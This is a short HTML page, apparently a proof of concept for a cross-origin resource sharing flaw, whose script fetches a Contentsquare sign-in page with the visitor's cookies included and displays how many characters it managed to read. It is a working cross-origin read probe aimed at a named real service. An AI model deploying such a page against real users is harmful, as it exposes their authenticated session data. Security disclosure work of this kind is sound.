<body>
    <div id="result">Testing...</div>
    <script>
        fetch('https://cshelper.contentsquare.com/login/signin.aspx?returnTo=%2f', {
            credentials: 'include'
        })
        .then(r => r.text())
        .then(data => {
            document.getElementById('result').innerHTML = 
                'âœ“ Successfully read ' + data.length + ' characters from Contentsquare';
        });
    </script>
</body>
